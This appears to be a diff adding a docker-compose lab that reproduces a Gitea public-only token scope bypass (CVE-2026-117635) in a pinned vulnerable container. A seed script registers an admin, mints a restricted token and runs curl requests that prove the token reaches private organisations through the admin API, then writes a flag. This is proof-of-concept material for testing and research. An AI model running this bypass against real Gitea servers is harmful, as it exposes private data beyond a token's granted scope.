@@ -1,0 +1,108 @@
+# CVE-2026-117635 - Gitea public-only token scope bypass on the admin API
+# Affected: Gitea <= 28.2.0 ; this lab pins the pre-fix image gitea 28.2.0 (mirrored to GHCR)
+# WARNING: intentionally VULNERABLE. Local testing only.
+# https://vulnerabletarget.com/VT-2026-117635
+
+services:
+  gitea:
+    image: ghcr.io/happyhackingspace/vt-2026-117635:28.2.0
+    container_name: vt-2026-117635
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+      - GITEA__database__DB_TYPE=sqlite3
+      - GITEA__security__INSTALL_LOCK=true
+      - GITEA__service__DISABLE_REGISTRATION=false
+      - GITEA__service__REGISTER_EMAIL_CONFIRM=false
+      - GITEA__service__ENABLE_CAPTCHA=false
+      - GITEA__server__ROOT_URL=http://localhost:3000/
+      - GITEA__server__HTTP_PORT=3000
+      - GITEA__log__LEVEL=warn
+    ports:
+      - "3000:3000"
+    networks:
+      - vt-net
+    healthcheck:
+      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:3000/api/v1/version || exit 1"]
+      interval: 5s
+      timeout: 5s
+      retries: 40
+      start_period: 10s
+
+  # Harness helper (not the vulnerable service): registers the first user (Gitea auto-promotes
+  # it to site admin), creates a private org, mints a public-only write:admin token, then runs
+  # the bypass differential and writes /proof/flag.txt. Seed logic is embedded here on purpose.
+  seed:
+    image: alpine:3.20
+    container_name: vt-2026-117635-seed
+    depends_on:
+      gitea:
+        condition: service_healthy
+    volumes:
+      - proof:/proof
+    networks:
+      - vt-net
+    entrypoint:
+      - sh
+      - -c
+      - |
+        set -eu
+        G=http://gitea:3000; U=vtadmin; P='VtAdmin123!'; ORG=secretorg
+        apk add --no-cache curl jq >/dev/null 2>&1
+        i=0; while [ $$i -lt 60 ]; do curl -fsS "$$G/api/v1/version" >/dev/null 2>&1 && break; i=$$((i+1)); sleep 2; done
+        echo "[seed] version: $$(curl -fsS $$G/api/v1/version)"
+        # Register first user -> auto site admin
+        curl -fsS -c /tmp/cj "$$G/user/sign_up" -o /tmp/s.html || true
+        CSRF=$$(grep -oE 'name="_csrf" value="[^"]+"' /tmp/s.html | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
+        curl -fsS -b /tmp/cj -c /tmp/cj -X POST "$$G/user/sign_up" \
+          --data-urlencode "_csrf=$$CSRF" --data-urlencode "user_name=$$U" \
+          --data-urlencode "email=$${U}@vt.local" --data-urlencode "password=$$P" \
+          --data-urlencode "retype=$$P" -o /dev/null -w "[seed] signup=%{http_code}\n" || true
+        # Private org
+        curl -fsS -u "$$U:$$P" -X POST "$$G/api/v1/orgs" -H 'Content-Type: application/json' \
+          -d "{\"username\":\"$$ORG\",\"visibility\":\"private\"}" -o /dev/null -w "[seed] org=%{http_code}\n" || true
+        # Public-only write:admin token
+        TOKEN=$$(curl -fsS -u "$$U:$$P" -X POST "$$G/api/v1/users/$$U/tokens" -H 'Content-Type: application/json' \
+          -d '{"name":"vt-public-only","scopes":["public-only","write:admin","read:organization","read:user"]}' | jq -r '.sha1 // empty')
+        echo "[seed] token (public-only,write:admin): $$TOKEN"
+        # Differential proof
+        C=$$(curl -s -w "\n%{http_code}" -H "Authorization: token $$TOKEN" "$$G/api/v1/orgs/$$ORG")
+        CC=$$(echo "$$C" | tail -n1); CB=$$(echo "$$C" | sed '$$d')
+        B=$$(curl -s -w "\n%{http_code}" -H "Authorization: token $$TOKEN" "$$G/api/v1/admin/orgs?limit=50")
+        BC=$$(echo "$$B" | tail -n1); BB=$$(echo "$$B" | sed '$$d')
+        mkdir -p /proof
+        {
+          echo "=== CVE-2026-117635 - Gitea public-only token scope bypass ==="
+          echo "admin: $$U / $$P   private_org: $$ORG"
+          echo "public_only_token: $$TOKEN"
+          echo "--- control GET /api/v1/orgs/$$ORG (expect 403) --- http=$$CC"; echo "$$CB"
+          echo "--- bypass  GET /api/v1/admin/orgs (expect 200+private) --- http=$$BC"; echo "$$BB"
+          if [ "$$CC" = 403 ] && [ "$$BC" = 200 ] && echo "$$BB" | grep -q '"visibility":"private"'; then
+            echo "VT{gitea-public-only-admin-bypass-CVE-2026-117635}"
+            echo "RESULT: VULNERABLE - public-only token refused on /orgs but reached private org via /admin/orgs"
+          else
+            echo "RESULT: NOT REPRODUCED (control=$$CC bypass=$$BC)"
+          fi
+        } | tee /proof/flag.txt
+        echo "[seed] nuclei: -var token=$$TOKEN -var org=$$ORG"
+
+  # Convenience: `docker compose run --rm proof-reader` prints the token and proof.
+  proof-reader:
+    image: alpine:3.20
+    depends_on:
+      seed:
+        condition: service_completed_successfully
+    volumes:
+      - proof:/proof
+    entrypoint: ["sh", "-c", "cat /proof/flag.txt 2>/dev/null || echo 'proof not ready; check: docker compose logs seed'"]
+    networks:
+      - vt-net
+    profiles:
+      - tools
+
+volumes:
+  proof:
+
+networks:
+  vt-net:
+    driver: bridge
